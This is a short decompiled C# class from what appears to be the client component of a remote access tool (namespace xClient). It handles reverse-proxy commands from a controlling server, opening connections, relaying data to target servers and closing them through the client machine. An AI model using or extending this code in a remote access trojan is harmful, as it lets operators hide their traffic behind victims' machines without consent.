using System;
using xClient.Core.Networking;
using xClient.Core.Packets;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.ReverseProxy
{
	// Token: 0x020000D8 RID: 216
	public class ReverseProxyCommandHandler
	{
		// Token: 0x0600056C RID: 1388 RVA: 0x00012E8C File Offset: 0x0001108C
		public static void HandleCommand(Client client, IPacket packet)
		{
			Type type = packet.GetType();
			if (type == typeof(ReverseProxyConnect))
			{
				client.ConnectReverseProxy((ReverseProxyConnect)packet);
				return;
			}
			if (type == typeof(ReverseProxyData))
			{
				ReverseProxyData reverseProxyData = (ReverseProxyData)packet;
				ReverseProxyClient reverseProxyByConnectionId = client.GetReverseProxyByConnectionId(reverseProxyData.ConnectionId);
				if (reverseProxyByConnectionId != null)
				{
					reverseProxyByConnectionId.SendToTargetServer(reverseProxyData.Data);
					return;
				}
			}
			else if (type == typeof(ReverseProxyDisconnect))
			{
				ReverseProxyDisconnect reverseProxyDisconnect = (ReverseProxyDisconnect)packet;
				ReverseProxyClient reverseProxyByConnectionId2 = client.GetReverseProxyByConnectionId(reverseProxyDisconnect.ConnectionId);
				if (reverseProxyByConnectionId2 != null)
				{
					reverseProxyByConnectionId2.Disconnect();
				}
			}
		}
	}
}
